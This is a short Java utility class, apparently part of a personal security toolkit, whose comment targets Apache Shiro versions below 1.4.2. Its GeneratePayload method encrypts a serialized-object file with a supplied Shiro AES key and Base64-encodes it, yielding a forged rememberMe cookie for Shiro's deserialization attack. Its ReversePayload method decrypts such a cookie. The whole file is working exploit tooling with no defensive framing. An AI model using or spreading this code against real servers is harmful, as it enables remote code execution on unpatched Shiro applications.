package com.sorry.utils.cipher;


import com.sorry.utils.bytesandfiles.TransforBytes;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

/**
 * created by 0x22cb7139 on 2021/4/15
 */


//shiro<1.4.2 cbc
public class rememberMeUtil {

    /*
    * @Description: 
    * @Param: [serilizeObj, key, objpath]
    * @return: java.lang.String
    */
    public static String GeneratePayload(String serilizefile,String key) throws Exception{

        byte[] plaintxt = TransforBytes.BytesFromFile(serilizefile);
        byte[] cipherkey = Base64.decode(key);
        byte[] encryptpayload = null;
        AesCipherService aesCipherService = new AesCipherService();
        ByteSource byteSource = aesCipherService.encrypt(plaintxt, cipherkey);
        encryptpayload = byteSource.getBytes();
        return Base64.encodeToString(encryptpayload);
    }

    /*
    * @Description:
    * @Param: [decoded, key]
    * @return: java.lang.String
    */
    public static String ReversePayload(String decoded,String key) throws Exception{

        byte[] ciphertxt = Base64.decode(decoded);
        byte[] cipherkey = Base64.decode(key);
        byte[] decryptpayload = null;
        AesCipherService aesCipherService = new AesCipherService();
        ByteSource byteSource = aesCipherService.decrypt(ciphertxt,cipherkey);
        decryptpayload = byteSource.getBytes();
        return Base64.encodeToString(decryptpayload);
    }

}

